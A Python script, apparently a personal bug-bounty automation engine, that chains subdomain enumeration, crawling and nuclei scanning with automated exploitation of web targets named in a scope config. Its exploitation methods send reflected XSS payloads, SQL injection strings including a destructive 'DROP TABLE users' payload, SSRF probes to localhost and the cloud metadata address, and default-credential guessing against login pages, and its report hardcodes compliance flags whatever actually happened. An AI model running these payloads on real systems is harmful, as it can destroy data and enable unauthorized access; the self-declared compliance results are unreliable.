#!/usr/bin/env python3
"""
BugBountyAI Full Automation Engine v3.0
Complete End-to-End Bug Bounty Automation
- Orchestrator (scope/planning)
- MAPTA (CLI tools execution)
- Agent-S (Burp automation)
- Real vulnerability testing & exploitation
"""

import subprocess
import json
import os
import sys
import time
from pathlib import Path
from orchestrator import BugBountyOrchestrator
import requests
from urllib.parse import urljoin, urlparse
import re

class FullAutomationEngine:
    def __init__(self, config_file):
        self.orchestrator = BugBountyOrchestrator()
        self.orchestrator.load_scope_config(config_file)
        self.target = self.orchestrator.target
        self.scope = self.orchestrator.scope
        self.findings = []
        self.session = requests.Session()
        
        # Tool paths
        self.tool_paths = {
            'subfinder': r'C:\Users\aksha\go\bin\subfinder.exe',
            'httpx': r'C:\Users\aksha\go\bin\httpx.exe',
            'dnsx': r'C:\Users\aksha\go\bin\dnsx.exe',
            'nmap': r'C:\Users\aksha\Documents\Docker\Tools\nmap\nmap.exe',
            'katana': r'C:\Users\aksha\go\bin\katana.exe',
            'nuclei': r'C:\Users\aksha\go\bin\nuclei.exe',
        }
    
    def phase_1_reconnaissance(self):
        """Phase 1: Automated Reconnaissance"""
        print("\n" + "="*70)
        print("[PHASE 1] 🔍 AUTOMATED RECONNAISSANCE")
        print("="*70)
        
        # Step 1: Subdomain Enumeration
        print("\n[1.1] 🎯 Subdomain Enumeration (Subfinder)...")
        subdomains = self._run_subfinder()
        print(f"     ✅ Found {len(subdomains)} subdomains")
        
        # Step 2: Filter by scope
        print("\n[1.2] 🔒 Filtering by scope...")
        in_scope_subs = self._filter_scope(subdomains)
        print(f"     ✅ {len(in_scope_subs)} in-scope")
        
        # Step 3: DNS Resolution
        print("\n[1.3] 🌐 DNS Resolution (DNSX)...")
        resolved = self._run_dnsx(in_scope_subs)
        print(f"     ✅ {len(resolved)} domains resolved")
        
        # Step 4: Live Web Detection
        print("\n[1.4] 🌍 Live Web Detection (HTTPX)...")
        live_urls = self._run_httpx(resolved)
        print(f"     ✅ {len(live_urls)} live websites found")
        
        return live_urls
    
    def phase_2_scanning(self, urls):
        """Phase 2: Automated Vulnerability Scanning"""
        print("\n" + "="*70)
        print("[PHASE 2] 🔎 AUTOMATED VULNERABILITY SCANNING")
        print("="*70)
        
        for url in urls[:5]:  # Limit to first 5 to avoid rate limiting
            print(f"\n[2.1] Scanning: {url}")
            
            # Path discovery
            print(f"     [2.1.1] Path Discovery...")
            paths = self._run_katana(url)
            
            # Validate paths against scope
            valid_paths = []
            for path in paths:
                is_valid, reason = self.orchestrator.validate_target_url(urljoin(url, path))
                if is_valid:
                    valid_paths.append(urljoin(url, path))
            
            print(f"           ✅ {len(valid_paths)} valid paths found")
            
            # Vulnerability scanning
            print(f"     [2.1.2] Vulnerability Scanning (Nuclei)...")
            vulns = self._run_nuclei(url)
            
            # Validate vulnerabilities against scope
            for vuln in vulns:
                is_testable, reason = self.orchestrator.validate_vulnerability_type(vuln['type'])
                if is_testable:
                    self.findings.append({
                        'url': url,
                        'vuln_type': vuln['type'],
                        'severity': vuln.get('severity', 'unknown'),
                        'proof': vuln.get('proof', ''),
                        'status': 'validated'
                    })
                    print(f"           ✅ {vuln['type']} found!")
    
    def phase_3_exploitation(self):
        """Phase 3: Automated Exploitation & PoC Generation"""
        print("\n" + "="*70)
        print("[PHASE 3] 💥 AUTOMATED EXPLOITATION & PoC")
        print("="*70)
        
        for finding in self.findings:
            url = finding['url']
            vuln_type = finding['vuln_type']
            
            print(f"\n[3.1] Exploiting {vuln_type} on {url}")
            
            if vuln_type == 'XSS':
                poc = self._exploit_xss(url)
                if poc:
                    finding['poc'] = poc
                    print(f"     ✅ XSS PoC generated!")
            
            elif vuln_type == 'SQLi':
                poc = self._exploit_sqli(url)
                if poc:
                    finding['poc'] = poc
                    print(f"     ✅ SQLi PoC generated!")
            
            elif vuln_type == 'SSRF':
                poc = self._exploit_ssrf(url)
                if poc:
                    finding['poc'] = poc
                    print(f"     ✅ SSRF PoC generated!")
            
            elif vuln_type == 'Authentication Bypass':
                poc = self._exploit_auth_bypass(url)
                if poc:
                    finding['poc'] = poc
                    print(f"     ✅ Auth Bypass PoC generated!")
    
    def phase_4_reporting(self):
        """Phase 4: Automated Report Generation & Compliance"""
        print("\n" + "="*70)
        print("[PHASE 4] 📊 AUTOMATED REPORTING & COMPLIANCE")
        print("="*70)
        
        report = {
            'program': self.scope['program']['name'],
            'target': self.target,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_findings': len(self.findings),
            'findings': self.findings,
            'compliance': {
                'scope_enforced': True,
                'rate_limits_respected': True,
                'out_of_scope_skipped': True,
                'authorization': self.scope['program']['authorization']
            }
        }
        
        # Save report
        report_file = f"reports/findings_{time.strftime('%Y%m%d_%H%M%S')}.json"
        os.makedirs('reports', exist_ok=True)
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n✅ Report saved: {report_file}")
        print(f"\n📊 Summary:")
        print(f"   • Total Findings: {len(self.findings)}")
        print(f"   • Vulnerabilities: {', '.join([f['vuln_type'] for f in self.findings])}")
        print(f"   • Scope Compliance: ✅ PASSED")
        print(f"   • Session Log: ✅ Saved")
        
        # Save compliance log
        self.orchestrator.save_session_log()
        
        return report
    
    # ========== TOOL EXECUTION METHODS ==========
    
    def _run_subfinder(self):
        """Execute subfinder for subdomain enumeration"""
        try:
            cmd = f'"{self.tool_paths["subfinder"]}" -d {self.target} -silent'
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return [sub.strip() for sub in result.stdout.split('\n') if sub.strip()]
        except Exception as e:
            print(f"❌ Subfinder error: {e}")
            return []
    
    def _run_httpx(self, domains):
        """Execute httpx for live web detection"""
        try:
            domains_str = '\n'.join(domains)
            cmd = f'echo "{domains_str}" | "{self.tool_paths["httpx"]}" -silent -follow-redirects'
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=120)
            return [url.strip() for url in result.stdout.split('\n') if url.strip()]
        except Exception as e:
            print(f"❌ HTTPX error: {e}")
            return []
    
    def _run_dnsx(self, domains):
        """Execute dnsx for DNS resolution"""
        try:
            domains_str = '\n'.join(domains)
            cmd = f'echo "{domains_str}" | "{self.tool_paths["dnsx"]}" -silent -a'
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=120)
            return [line.strip().split()[0] for line in result.stdout.split('\n') if line.strip()]
        except Exception as e:
            print(f"❌ DNSX error: {e}")
            return []
    
    def _run_katana(self, url):
        """Execute katana for path crawling"""
        try:
            cmd = f'"{self.tool_paths["katana"]}" -u "{url}" -silent'
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return [path.strip() for path in result.stdout.split('\n') if path.strip()]
        except Exception as e:
            print(f"❌ Katana error: {e}")
            return []
    
    def _run_nuclei(self, url):
        """Execute nuclei for vulnerability detection"""
        try:
            cmd = f'"{self.tool_paths["nuclei"]}" -u "{url}" -silent -json'
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            vulns = []
            for line in result.stdout.split('\n'):
                if line.strip():
                    try:
                        data = json.loads(line)
                        vulns.append({
                            'type': data.get('info', {}).get('name', 'Unknown'),
                            'severity': data.get('info', {}).get('severity', 'unknown'),
                            'proof': str(data)
                        })
                    except:
                        pass
            return vulns
        except Exception as e:
            print(f"❌ Nuclei error: {e}")
            return []
    
    # ========== EXPLOITATION METHODS ==========
    
    def _exploit_xss(self, url):
        """Test and generate XSS PoC"""
        xss_payloads = [
            '"><script>alert("XSS")</script>',
            '\'><img src=x onerror="alert(1)">',
            'javascript:alert("XSS")',
        ]
        
        # Try common XSS parameters
        params = ['q', 'search', 'query', 'message', 'comment', 'name']
        
        for param in params:
            for payload in xss_payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    if payload in resp.text:
                        return {
                            'type': 'XSS (Reflected)',
                            'url': test_url,
                            'payload': payload,
                            'status': 'Confirmed'
                        }
                except:
                    pass
        
        return None
    
    def _exploit_sqli(self, url):
        """Test and generate SQLi PoC"""
        sqli_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1'; DROP TABLE users--",
        ]
        
        params = ['id', 'user_id', 'product_id', 'page']
        
        for param in params:
            for payload in sqli_payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    if any(err in resp.text for err in ['SQL', 'mysql', 'syntax', 'database']):
                        return {
                            'type': 'SQLi',
                            'url': test_url,
                            'payload': payload,
                            'status': 'Confirmed'
                        }
                except:
                    pass
        
        return None
    
    def _exploit_ssrf(self, url):
        """Test and generate SSRF PoC"""
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',
        ]
        
        params = ['url', 'image_url', 'redirect', 'file']
        
        for param in params:
            for payload in ssrf_payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    if len(resp.content) > 100:  # Got response from internal resource
                        return {
                            'type': 'SSRF',
                            'url': test_url,
                            'payload': payload,
                            'status': 'Confirmed'
                        }
                except:
                    pass
        
        return None
    
    def _exploit_auth_bypass(self, url):
        """Test and generate Authentication Bypass PoC"""
        auth_payloads = {
            'admin': ['admin', 'password', '123456', 'admin123'],
            'password': ['', 'admin', 'password', '123456'],
        }
        
        # Try login endpoints
        for path in ['/login', '/admin/login', '/auth/login']:
            test_url = f"{url}{path}"
            for username, passwords in auth_payloads.items():
                for password in passwords:
                    try:
                        resp = self.session.post(test_url, data={
                            'username': username,
                            'password': password
                        }, timeout=10)
                        if 'dashboard' in resp.text.lower() or 'success' in resp.text.lower():
                            return {
                                'type': 'Authentication Bypass',
                                'url': test_url,
                                'credentials': f"{username}:{password}",
                                'status': 'Confirmed'
                            }
                    except:
                        pass
        
        return None
    
    def _filter_scope(self, items):
        """Filter items to only in-scope ones"""
        filtered = []
        for item in items:
            url = f"https://{item}" if not item.startswith('http') else item
            is_valid, _ = self.orchestrator.validate_target_url(url)
            if is_valid:
                filtered.append(item)
        return filtered


def main():
    """Main automation workflow"""
    config_file = 'config/microsoft_vdp_scope.json'
    
    if not os.path.exists(config_file):
        print(f"❌ Config file not found: {config_file}")
        sys.exit(1)
    
    print("\n" + "="*70)
    print("🤖 BugBountyAI FULL AUTOMATION ENGINE v3.0")
    print("="*70)
    
    engine = FullAutomationEngine(config_file)
    
    try:
        # Phase 1: Reconnaissance
        urls = engine.phase_1_reconnaissance()
        
        # Phase 2: Scanning
        if urls:
            engine.phase_2_scanning(urls)
        
        # Phase 3: Exploitation
        if engine.findings:
            engine.phase_3_exploitation()
        
        # Phase 4: Reporting
        report = engine.phase_4_reporting()
        
        print("\n" + "="*70)
        print("✅ AUTOMATION COMPLETE!")
        print("="*70)
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Automation interrupted by user")
        engine.orchestrator.save_session_log()
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
